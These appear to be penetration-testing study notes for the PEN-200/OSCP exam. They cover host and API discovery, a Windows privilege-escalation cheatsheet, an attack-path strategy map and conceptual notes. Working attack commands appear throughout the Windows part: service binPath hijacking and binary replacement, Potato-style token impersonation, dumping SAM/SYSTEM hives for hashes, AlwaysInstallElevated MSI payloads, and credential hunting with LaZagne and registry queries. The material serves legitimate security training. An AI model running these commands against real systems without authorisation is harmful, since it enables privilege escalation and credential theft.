text: id="variant-10-16-11-1-5">10.16.11.1.5 Find: Discover virtual hosts and hostname-selected applications Collect hostnames from redirects, certificates, DNS and source; compare named requests against an invalid-host control. curl -sk --resolve HOSTNAME:PORT:TARGET https://HOSTNAME:PORT/ Recognize: A reproducible hostname-selected application is a new mapping target on the same address. Validate next: Send a random Host header as a negative control, compare the candidate's real response, then browse it with the correct hostname. A different status caused only by redirects or a default site is not a confirmed vhost. Discover virtual hosts and hostname-selected applications . <summary

title: 10.16.11.1.6 Find: Map parameters, API methods, objects and writable properties
text: id="variant-10-16-11-1-6">10.16.11.1.6 Find: Map parameters, API methods, objects and writable properties Capture a valid API request, inspect its schema/client code and compare allowed methods and controlled object/role contexts. curl -sk -i -b cookies.txt http://TARGET:PORT/api/PATH Recognize: The actual object, method and writable input are known; returned owner/role fields are only candidate security boundaries. Validate next: Determine field binding, ownership, persistence and server authorization with controlled accounts. Map parameters, API methods, objects and writable properties .

title: 10.17 Windows Privilege Escalation Cheatsheet
text: id="windows-privilege-escalation-cheatsheet">10.17 Windows Privilege Escalation Cheatsheet ← Cheatsheet index | Full procedure | Credential use | Strategy map | Study methods: Escalate privileges on Windows TOKEN → CONTROLLED INPUT → EFFECTIVE RIGHT → PRIVILEGED CONSUMER → RUN-AS → TRIGGER → VERIFIED EFFECT <h2

title: 10.17.1 Early tool-assisted pass
text: id="early-tool-assisted-pass">10.17.1 Early tool-assisted pass Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity. whoami /all winPEASx64.exe log Tool-to-finding workflow . <h2

title: 10.17.2 Token and host baseline
text: id="token-and-host-baseline">10.17.2 Token and host baseline hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort InstalledOn -Descending Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select Name,State,StartMode,PathName Record integrity level , enabled/deny-only groups and enabled/present privileges. Medium-integrity Administrators membership is not a high-integrity process. Prefer CIM; WMIC may be absent. Get-HotFix is not a complete update inventory. <h2

title: 10.17.3 Effective ACLs
text: id="effective-acls">10.17.3 Effective ACLs icacls "C:\Path\To\OBJECT" sc.exe sdshow SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE F full · M modify · RX read/execute · R read · W write · D delete · I inherited · OI object inherit · CI container inherit. File, directory, registry, service and task ACLs are distinct. Check the exact object/right and current enabled SID . MIC can still block write-up. <h2

title: 10.17.4 Credentials and artifacts
text: id="credentials-and-artifacts">10.17.4 Credentials and artifacts cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul Get-Content -LiteralPath (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | Select-String 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false cmdkey proves a target-bound stored entry, not plaintext. DPAPI artifacts need the protecting user/machine context. Classify identity/type/scope before reuse. <h2

title: 10.17.5 Services
text: id="services">10.17.5 Services Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE Need control + higher SERVICE_START_NAME + trigger. SERVICE_CHANGE_CONFIG , start and stop are separate rights. Use sc.exe in PowerShell; bare sc may be Set-Content . <summary

title: 10.17.5.1 Change service path and restore
text: id="variant-10-17-5-1">10.17.5.1 Change service path and restore sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" Space after binPath= is required. Error 1053 may still follow payload execution; verify effect and restore. <summary

title: 10.17.5.2 Replace writable binary
text: id="variant-10-17-5-2">10.17.5.2 Replace writable binary copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE Check parent delete/create rights, file locks, architecture and recovery. <h2

title: 10.17.6 Unquoted service paths
text: id="unquoted-service-paths">10.17.6 Unquoted service paths Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select Name,StartName,State,StartMode,PathName icacls C:\ icacls "C:\Program Files" icacls "C:\Program Files\Vendor App" sc.exe qc SERVICE For C:\Program Files\Vendor App\svc.exe , prove an earlier missing prefix such as C:\Program.exe or C:\Program Files\Vendor.exe is creatable, service runs higher and trigger exists. <h2

title: 10.17.7 DLL/helper search
text: id="dllhelper-search">10.17.7 DLL/helper search icacls "C:\Path\To\Application" sc.exe qc SERVICE reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" Need observed exact DLL request/load, selected writable searched directory, bitness/exports, privileged process and trigger. Account for redirection, API sets, SxS, loaded modules, KnownDLLs and application search flags. Procmon CreateFile + .dll + NAME NOT FOUND is useful when available. <h2

title: 10.17.8 Scheduled tasks and startup consumers
text: id="scheduled-tasks-and-startup-consumers">10.17.8 Scheduled tasks and startup consumers schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml icacls "C:\Path\To\task-script.ps1" icacls "C:\Path\To" schtasks /run /tn "\FOLDER\TASK" Get-ScheduledTask | ForEach-Object { $t=$_ [pscustomobject]@{Task="$($t.TaskPath)$($t.TaskName)";User=$t.Principal.UserId;RunLevel=$t.Principal.RunLevel;Actions=($t.Actions|Out-String).Trim()} } reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" Need writable consumed action/file plus higher principal and reliable trigger. Highest is relative to the task principal. /run accepted is not execution proof. <h2

title: 10.17.9 AlwaysInstallElevated and UAC
text: id="alwaysinstallelevated-and-uac">10.17.9 AlwaysInstallElevated and UAC reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi Run only if both values are 0x1 . whoami /groups reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin UAC bypass normally raises an already-admin filtered token ; it is not ordinary standard-user escalation. <h2

title: 10.17.10 Token privileges
text: id="token-privileges">10.17.10 Token privileges whoami /priv Privilege Do not proceed until SeImpersonatePrivilege Privileged auth trigger, build/arch/runtime and tool match SeAssignPrimaryTokenPrivilege Useful token and process-creation requirements match SeBackupPrivilege Privilege enabled and backup-aware read has useful target SeRestorePrivilege Restore-aware write feeds a privileged consumer SeDebugPrivilege Target process is useful and not protected from access SeLoadDriverPrivilege Driver is compatible/loadable/exploitable; crash risk accepted SeTakeOwnershipPrivilege Ownership can become DACL /content control over a consumed object <summary

title: 10.17.10.1 Impersonation variants
text: id="variant-10-17-10-1">10.17.10.1 Impersonation variants PrintSpoofer64.exe -i -c "cmd.exe" GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt" Pick by actual prerequisite, not “Potato” name. Verify a SYSTEM process/effect with whoami /all . <summary

title: 10.17.10.2 Backup privilege to local hashes
text: id="variant-10-17-10-2">10.17.10.2 Backup privilege to local hashes reg save HKLM\SAM C:\Windows\Temp\SAM.hive reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL Matched hives produce local credential material, not automatic SYSTEM or remote authorization . <h2

title: 10.17.11 Software, drivers and kernel
text: id="software-drivers-and-kernel">10.17.11 Software, drivers and kernel Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Select DisplayName,DisplayVersion,Publisher,InstallLocation systeminfo driverquery /v Order: deterministic config/credential → exact privileged app → exact driver → kernel last. Validate build, cumulative update, architecture, component/config, exploit source and stability. Avoid Win32_Product . <h2

title: 10.17.12 Automated candidate generation
text: id="automated-candidate-generation">10.17.12 Automated candidate generation winPEASx64.exe log Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt" Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json" powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML" Import-Module .\PowerUp.ps1 Invoke-AllChecks Validate every highlight manually. PrivescCheck may skip checks when elevated; Seatbelt has no official prebuilt binaries; PowerUp upstream is archived. Tool block/failure routes to native checks. <h2

title: 10.17.13 Failure routing
text: id="failure-routing">10.17.13 Failure routing Symptom Next action Service config denied Service DACL/current token; then binary/DLL/config No service restart right Boot/dependency trigger or another path Unquoted but no writable prefix Disprove DLL never requested Search/load evidence, bitness and trigger Task accepted/no effect Action, conditions, working directory, LastTaskResult/history Token tool fails Privilege state, build, runtime and trigger prerequisite Hashes/no higher shell Credential type, account state, protocol and authorization Enumerator blocked Native checks; not “no findings” <h2

title: 10.17.14 Verify and re-enumerate
text: id="verify-and-re-enumerate">10.17.14 Verify and re-enumerate whoami /all hostname ipconfig /all Re-enumerate credentials, services, tasks, sessions, listeners, routes and domain context after every identity/integrity change. <h2

title: 10.17.15 Recover supported application stores with LaZagne
text: id="recover-supported-application-stores-with-lazagne">10.17.15 Recover supported application stores with LaZagne Use a reviewed build in the relevant user's context; system-protected stores can require elevation. REM Start with the relevant application family laZagne.exe browsers REM Broader collection with a text report laZagne.exe all -oN Keep application, account and source with each value. Test it against the matching service. Empty output → check profile/decryption access and use manual config/history/vault checks. Full Windows credential hunting . <h2

title: 10.17.16 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.17.16 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.17.16.1 Escalate privileges on Windows
text: id="escalate-privileges-on-windows">10.17.16.1 Escalate privileges on Windows <summary

title: 10.17.16.1.1 Find: Establish Windows token, host and process context
text: id="variant-10-17-16-1-1">10.17.16.1.1 Find: Establish Windows token, host and process context At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator. whoami /all systeminfo tasklist /svc Recognize: An Administrators SID exists but this effective process is filtered/medium-integrity. Validate next: Check actual enabled privileges and object operations in the process that will perform the action. Establish Windows token, host and process context . <summary

title: 10.17.16.1.2 Find: Prove effective file, registry and service-object permissions
text: id="variant-10-17-16-1-2">10.17.16.1.2 Find: Prove effective file, registry and service-object permissions Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions. icacls "C:\Path\To\OBJECT" icacls "C:\Path\To" sc.exe sdshow SERVICE Recognize: A modifiable parent can differ from a read-only file; service configuration rights are another control plane. Validate next: Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger. Prove effective file, registry and service-object permissions . <summary

title: 10.17.16.1.3 Find: Recover Windows application, history and stored-credential artifacts
text: id="variant-10-17-16-1-3">10.17.16.1.3 Find: Recover Windows application, history and stored-credential artifacts Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context. cmdkey /list reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName Recognize: A target-bound saved credential is a possible consumer capability, not a plaintext password. Validate next: Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route. Recover Windows application, history and stored-credential artifacts . <summary

title: 10.17.16.1.4 Find: Change a privileged service's executable configuration
text: id="variant-10-17-16-1-4">10.17.16.1.4 Find: Change a privileged service's executable configuration Inventory service accounts/paths, select a higher-identity service and query its effective service-object rights with the current token. Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName sc.exe qc SERVICE accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE Recognize: Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them. Validate next: Use sc qc to read the service account and command, sc sdshow/AccessChk to verify configuration rights and sc query to inspect state. Confirm an allowed start/restart trigger before changing the service, then verify whoami. Change a privileged service's executable configuration . <summary

title: 10.17.16.1.5 Find: Replace a privileged service binary or consumed file
text: id="variant-10-17-16-1-5">10.17.16.1.5 Find: Replace a privileged service binary or consumed file From service inventory follow the exact executable/script path and inspect both its own ACL and its parent's replacement rights. sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" Recognize: A higher-identity service consumes a potentially replaceable file in a modifiable directory. Validate next: Use sc qc to locate the real binary and account, then icacls on that file and its parent. Confirm replacement rights and an available privileged service start/restart; a writable unrelated file is insufficient. Replace a privileged service binary or consumed file . <summary

title: 10.17.16.1.6 Find: Exploit an unquoted service path with a writable earlier prefix
text: id="variant-10-17-16-1-6">10.17.16.1.6 Find: Exploit an unquoted service path with a writable earlier prefix List service command lines and accounts, then inspect every earlier executable prefix in the actual unquoted path. Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName Recognize: Spaces plus absent executable quoting create candidate earlier prefixes; writable placement and trigger remain unproved. Validate next: Read the unquoted service command with sc qc. Check each earlier executable prefix for write/create access with icacls; confirm the service account and restart trigger. Spaces alone do not make the path exploitable. Exploit an unquoted service path with a writable earlier prefix . <summary

title: 10.17.16.1.7 Find: Control a privileged DLL, helper or configuration load
text: id="variant-10-17-16-1-7">10.17.16.1.7 Find: Control a privileged DLL, helper or configuration load Investigate a privileged application with observed dependency failures; if permitted, filter its runtime file loads in Procmon before checking candidate directory ACLs. Procmon, when accessible: filter the actual process; inspect requested .dll paths and NAME NOT FOUND results. Record the exact requested filename and every searched location. Then inspect the selected location's effective ACL with the owning procedure. Recognize: An actual requested missing dependency is stronger than guessing a DLL name, but does not prove an attacker-controlled resolution wins. Validate next: Validate real privilege, search precedence/KnownDLLs/manifests, directory control, ABI/exports and a load trigger. Control a privileged DLL, helper or configuration load . <summary

title: 10.17.16.1.8 Find: Control scheduled tasks, startup files or autostart consumers
text: id="variant-10-17-16-1-8">10.17.16.1.8 Find: Control scheduled tasks, startup files or autostart consumers Enumerate task definitions and inspect the action, principal, arguments and working directory before permission-checking its files. schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml Recognize: A named privileged task exposes a concrete consumer and action path to investigate. Validate next: Read the task's exact action, principal and trigger with schtasks or Get-ScheduledTask. Check icacls on its file/parents and prove the stronger identity will consume the controlled path at a reachable trigger. Control scheduled tasks, startup files or autostart consumers . <summary

title: 10.17.16.1.9 Find: Validate elevated installer policy and administrative-token context
text: id="variant-10-17-16-1-9">10.17.16.1.9 Find: Validate elevated installer policy and administrative-token context Inspect both machine/user installer-policy values and the current token before inferring an elevated MSI or UAC-context route. reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated whoami /all Recognize: One policy value is insufficient; the two-policy conjunction is the key recognition condition. Validate next: For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately. Validate elevated installer policy and administrative-token context . <summary

title: 10.17.16.1.10 Find: Select a privilege-backed impersonation or object-control route
text: id="variant-10-17-16-1-10">10.17.16.1.10 Find: Select a privilege-backed impersonation or object-control route Inspect the current token's privileges, then map a relevant privilege to an actual protected operation and available source/trigger. whoami /priv whoami /all Recognize: An impersonation capability is present; the privileged authentication source required by a specific tool is not established. Validate next: Read whoami /priv and whoami /all. Match the exact privilege, enabled state and token context to the technique's required API/trigger, then verify the resulting identity; the privilege name alone is not SYSTEM. Select a privilege-backed impersonation or object-control route . <summary

title: 10.17.16.1.11 Find: Use backup privilege to obtain protected local credential material
text: id="variant-10-17-16-1-11">10.17.16.1.11 Find: Use backup privilege to obtain protected local credential material Inspect the actual token for backup-related rights and distinguish a privilege-aware read API from an ordinary file copy. whoami /priv Recognize: The privilege is assigned but initially disabled; permitted software may enable it for backup-semantic reads. Validate next: Check that the privilege can actually be used, supporting API/context, complete matched source set and writable output. Use backup privilege to obtain protected local credential material . <summary

title: 10.17.16.1.12 Find: Select a matching application, driver or kernel exploit
text: id="variant-10-17-16-1-12">10.17.16.1.12 Find: Select a matching application, driver or kernel exploit Collect OS build/patch and relevant installed driver/application versions before comparing any local-exploit requirement. Get-ComputerInfo | Select-Object OsBuildNumber,OsArchitecture Get-HotFix Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName Recognize: The exact component/build is the candidate evidence; an OS-family name or one missing KB is insufficient. Validate next: Verify vendor patch state, required driver/service/feature, architecture and PoC assumptions. Select a matching application, driver or kernel exploit . <summary

title: 10.17.16.1.13 Find: Turn automated Windows findings into manually verified candidates
text: id="variant-10-17-16-1-13">10.17.16.1.13 Find: Turn automated Windows findings into manually verified candidates Select a reviewed tool after checking host/runtime; treat each highlighted service, token or path as a lead to native evidence. whoami /all $PSVersionTable $ExecutionContext.SessionState.LanguageMode Recognize: The enumerator located a configuration clue, not the full usable chain. Validate next: Run winPEAS with log output, then inspect the exact reported service with sc qc/sc sdshow and its file with icacls. Check token highlights with whoami /priv. A collector's colored line is not the resulting elevated token. Turn automated Windows findings into manually verified candidates .

title: 0.2 Attack Strategy Map
text: id="attack-strategy-map">0.2 Attack Strategy Map Main index | Study sequence | Shared concepts | Cheatsheets Choose an objective, compare the methods by their prerequisites, then open a self-contained entry. Each entry explains how to find its enabling conditions, why it works, how to execute and verify it, how failures change the decision, and which methods its result can unlock. The map contains 166 documented methods across 15 topic guides , accounting for all 15 speedrun blocks and the eight grouped study units. Counts describe this preparation inventory, not every vulnerability or environment-specific chain that can exist. For Active Directory, use the numbered AD Notes , including raw-output comparisons , approach selection and unanswered changed-condition cases . <h2

title: 0.2.1 Discover the clue before choosing a method
text: id="discover-the-clue-before-choosing-a-method">0.2.1 Discover the clue before choosing a method Follow starting access → investigation location → discovery action → illustrative evidence → recognition → missing-condition checks → method selection. Each entry distinguishes enabled-after-validation, ruled-out and inconclusive examples. Begin with the topic workflow when you do not yet have a useful clue: Starting investigation Discovery workflow Discover attack surfaces Where to start Extract opportunities from services Where to start Map useful web behavior Where to start Turn application weaknesses into access Where to start Recover and use authentication material Where to start Select and adapt public exploits Where to start Establish sessions and move files Where to start Escalate privileges on Linux Where to start Escalate privileges on Windows Where to start Map Active Directory attack paths Where to start Gain a more useful domain identity Where to start Move to another host Where to start Reach internal services Where to start Resolve payload execution obstacles Where to start Complete attacks and retain reproducible evidence Where to start Test discovery and prerequisite reasoning with the unanswered recognition cases before consulting the explanations. <h2

text: id="start-from-your-current-capability">0.2.2 Start from your current capability What you have or need Open An address, uncertain reachability, or incomplete port coverage Discovery A reachable service and an anonymous or authenticated access context Service opportunities A website with unexplored requests, roles, files or APIs Web mapping A suspicious application behavior or a read/write/injection primitive Web exploitation A password, key, hash, captured response or ticket Credentials A component with a plausible public exploit Exploit adaptation Command execution, a limited session, or a file that must move Sessions and transfers A Linux foothold Linux privilege escalation A Windows foothold Windows privilege escalation A domain identity with unknown rights and relationships AD mapping A credential source or effective domain-object right AD identity transitions Authentication material and a destination host Lateral movement A service behind another host, or a broken return path Pivoting A delivered artifact or payload that does not produce its expected effect Execution troubleshooting Competing paths, stalled progress, or evidence/reporting work Integration and evidence <h2

text: id="follow-the-result-into-the-next-method">0.2.4 Follow the result into the next method Observed result What must still be proved Next objective New hostname, interface, listener or subnet Scope, source position and reachability Discovery and service enumeration Readable configuration, repository history or file Artifact type, account context and whether its value is current Credential classification and compatible reuse File write or upload Executing consumer, file interpretation, permissions and trigger Web execution or local escalation Command execution Host, identity, output channel and connection direction Session establishment and transfer Higher local privilege Effective token /UID and additional readable credential sources Credential access and re-enumeration New domain identity or directory right Effective right on the exact object and the resulting service authorization AD identity transitions or lateral movement Successful authentication Destination-specific execution/logon rights Compatible remote service method New route or proxy Destination service reachability, name resolution and callback path Re-enumerate from the new vantage point <h3

title: 0.2.4.1 Paper-based chain rehearsal
text: id="paper-based-chain-rehearsal">0.2.4.1 Paper-based chain rehearsal Linux standalone: Validate the source path and discover hosts → Discover TCP ports with SYN or connect scans → Establish scheme, host, redirects and request state → Map functions, roles and normal requests manually → Read files through directory traversal → Classify the artifact and its identity context → Validate known passwords and context-specific reuse → Use SSH passwords, keys and forwarding-capable access → Establish Linux state and choose an escalation candidate → Use an allowed sudo operation to cross a privilege boundary → Establish Linux state and choose an escalation candidate . Windows standalone: Validate the source path and discover hosts → Discover TCP ports with SYN or connect scans → Establish scheme, host, redirects and request state → Map functions, roles and normal requests manually → Establish upload acceptance, storage and retrieval → Execute an uploaded file through a compatible handler → Verify command execution, host and represented identity → Establish Windows token, host and process context → Change a privileged service's executable configuration → Establish Windows token, host and process context . AD roast and movement: Establish domain identity, DC, DNS, time and route → Enumerate directory objects with native, LDAP and PowerView approaches → Request a selected service ticket for offline service-account recovery → Recover passwords with feasible dictionary, rule and mask attacks → Validate known passwords and context-specific reuse → Match route, destination service and effective authorization → Use WinRM, WinRS or PowerShell remoting → Establish Windows token, host and process context → Select a privilege-backed impersonation or object-control route → Obtain accessible live logon-session credential material → Recover or reuse an NT password hash → Select password, NT hash, key-to-ticket or ticket authentication → Execute through uploaded service creation using PsExec . AD replication and evidence: Establish domain identity, DC, DNS, time and route → Enumerate directory objects with native, LDAP and PowerView approaches → Validate effective directory-object control → Use validated directory replication rights for bounded credential proof → Capture state-transition, proof and exploit-adaptation evidence → Build and validate the report and submission artifacts . Pivoted domain access: Discover pivot interfaces, routes and internal service context → Route a selected internal subnet through Ligolo-ng → Preserve DNS, Kerberos names and time across a pivot → Establish domain identity, DC, DNS, time and route → Enumerate directory objects with native, LDAP and PowerView approaches → Collect focused BloodHound data and validate an attack path → Validate effective directory-object control → Add a controlled identity to a group through effective membership rights → Use WinRM, WinRS or PowerShell remoting . Execution and callback repair: Verify command execution, host and represented identity → Connect a Linux reverse shell through an available interpreter → Diagnose connection direction, listener and session failures in order → Pair staged payloads with the correct handler and session lifecycle → Verify command execution, host and represented identity . At every arrow identify the produced capability and the next method's missing prerequisite. An expected result in these examples is hypothetical, not recorded lab evidence. <h2

title: 0.2.5 Study order and boundaries
text: id="study-order-and-boundaries">0.2.5 Study order and boundaries Use Units 1–8 in the speedrun study sequence : Blocks 1+2; 3+4; 5; 6+7; 8 then 9; 13 fundamentals then 10→11→12; remaining 14; and 15. Relevant execution diagnostics recur throughout. Core methods follow the established OSCP preparation route. AD CS, delegation/RBCD, broader GPO/ticket-forging branches and less-common service/tunnel options retain their explicit conditional context. Their prerequisites must be verified before selecting them. Dedicated buffer-overflow and shellcode development remain excluded by learner choice; selecting, compiling and adapting an existing memory-corruption PoC remains covered. Commercial/mass vulnerability scanners, automatic exploitation and prohibited spoofing workflows are not operational exam paths. Some course topics therefore have recognition-only or conditional treatment. Read the current official exam guide before choosing restricted framework features; the Body of Knowledge describes competencies separately from tool permission. Concept study includes the worked commands and reasoning here. Practical exploitation and independent retests follow the learner's explicit closure of the concept phase. Study coverage is separate from practical competence.

title: 0.1 Master Notes
text: id="master-notes">0.1 Master Notes Back to the index | Attack Strategy Map Use these notes to understand why an attack works, recognize its prerequisites, interpret results and decide what to try next. Open the linked operational procedures for commands. Source section/page references identify topics in the supplied 2025 PEN-200 edition; the explanations here are original summaries. Use the method guides for complete study entries: outcome, recognition, prerequisites, prerequisite discovery, mechanics, baseline/variants, worked example, verification, failure and next transitions. This page keeps the shared concepts that connect those entries: evidence and access claims, effective permissions, identity/material types, privileged consumers, authentication versus authorization and network reachability. Method-specific commands remain synchronized with their owning operational procedures. <h2

title: 0.1.1 Contents
text: id="contents">0.1.1 Contents Discovering and recognizing attack opportunities Finding attack surfaces Enumeration and attack selection Extracting opportunities from services Scan coverage and uncertain results Credentials and changing access Web behavior to access Public exploit selection and adaptation Shells and file transfer Payload delivery and execution controls Privilege escalation Active Directory attack reasoning Tunnels and network reachability Integrated attack control, stagnation and recovery Evidence and reproducibility <h2

title: 0.1.2 Discovering and recognizing attack opportunities
text: id="discovering-and-recognizing-attack-opportunities">0.1.2 Discovering and recognizing attack opportunities A useful recognition clue is not just a fact worth memorizing. It is an observation obtained from a particular access position through a reproducible investigation. Start with the capability you actually have, choose a relevant location or interface, perform a scoped discovery action, and identify the exact output detail that makes a method worth considering. Use this sequence: starting access → investigation location → discovery action → observation → candidate method → missing-condition check → selection. Each topic workflow supplies a first pass; each method's recognition section shows how a clue can emerge, what synthetic evidence might resemble, and what it does not prove. Keep the scope of the observation attached to the conclusion. A query of the current host does not enumerate a remote destination. A valid password does not establish authorization to execute commands. A writable script does not establish that a privileged consumer will execute it. A banner does not establish the affected configuration. A truncated directory query does not establish absence. Separate discovery from confirmation. “An unquoted service path exists” can justify investigating writable earlier path components; it cannot replace that permission check. “An account has a directory flag” can justify investigating an identity transition; enabled state, KDC behavior, credential requirements and connectivity still constrain the result. Classify the decision as enabled after the relevant validation, ruled out in the tested context, or inconclusive because decisive evidence is missing. A timeout, incomplete query or inaccessible setting normally leaves uncertainty; it is not automatically a negative result. A disproven condition rules out this route from this context, not every other attack against the host. The guide examples are synthetic teaching evidence, not transcripts or lab validation. Some combine abbreviated command-style fields with explicitly labelled observations from preceding investigation; do not expect an exact tool-format match. Attempt the unanswered recognition cases before consulting the guides, and explain the missing check as well as the attack name. <h3

title: 0.1.2.1 Put collection early, then follow the finding
text: id="put-collection-early-then-follow-the-finding">0.1.2.1 Put collection early, then follow the finding After a foothold, confirm identity and runtime, then use a reviewed collector such as LinPEAS or winPEAS early to find leads. Manual competence means understanding and verifying the selected finding, not postponing useful collection until every manual technique has been exhausted. A useful sudo rule or readable credential can be followed immediately; finishing every collector is not a prerequisite. Use the named object to choose the next test: sudo -l for an allowed operation; namei/stat/getfacl for a Linux path; sc qc/sc sdshow and icacls for a Windows service; pspy or task/unit inspection for a transient privileged consumer. A color, graph edge or writable file does not substitute for that check. Follow the linked procedure when its conditions hold; otherwise choose another observed lead. See the Linux first pass and Windows first pass . Supplements: PEASS-ng , pspy , Hexdump Linux and Hexdump Windows . <h3

title: 0.1.2.2 Tool lookup follows the task
text: id="tool-lookup-follows-the-task">0.1.2.2 Tool lookup follows the task Use the tools/scripts index to reach a complete procedure by tool name. The command-first organization is informed by 0xsyr0/OSCP ; our recognition examples and permission/context explanations remain alongside the procedures. Verify syntax against the owning tool: a community sheet can describe an older release. For example, current PrivescCheck uses -Report for formats, whereas older examples can use a separate -Format option. A credential transition also has a context: RunasCs can create a process with another account, while logon type 9 supplies outbound credentials without changing the local identity. Therefore local whoami is useful for the former and insufficient to validate the latter. Application-store recovery similarly depends on the profile and decryption context available to LaZagne; a recovered value must still be matched to an identity and service. <h2

title: 0.1.3 Finding attack surfaces
text: id="finding-attack-surfaces">0.1.3 Finding attack surfaces An attack surface is the set of reachable behaviors an attacker can interact with from a particular source position. For the first network pass, represent every candidate as: SOURCE -> TARGET | TRANSPORT/PORT | OBSERVED STATE | APPLICATION EVIDENCE | ACCESS CONTEXT | COVERAGE LIMIT This prevents several common reasoning errors. A TCP and UDP endpoint with the same number are different surfaces. A service reachable from an internal host may be filtered from Kali. A port-based name is not application proof. A listening application is not automatically vulnerable, and a vulnerable build may still lack the configuration or access prerequisite needed by an exploit. <h3

title: 0.1.3.1 The four questions are separate
text: id="the-four-questions-are-separate">0.1.3.1 The four questions are separate Question Evidence that answers it What remains unknown Is the host observable from this source? Host-discovery response or another direct response Untested hosts may suppress discovery; ports remain unknown Which endpoints respond? Port-scan states for the stated transport and selection Untested ports/transport and exact applications What application is present? Version probes, banners or protocol behavior Configuration, permissions and vulnerability prerequisites Which path deserves the next test? Application evidence plus a cheap prerequisite test Exploitability until the required conditions are confirmed Treat a scan as a measurement, not a verdict. Its conclusion is bounded by source, destination, time, transport, ports, discovery mode, scan type and network conditions. Record those dimensions whenever a result changes the investigation. <h3

title: 0.1.3.2 Why the states occur
text: id="why-the-states-occur">0.1.3.2 Why the states occur TCP supplies explicit connection signals. In a SYN scan, SYN/ACK normally supports open , RST normally supports closed , and silence or selected ICMP errors can lead to filtered .
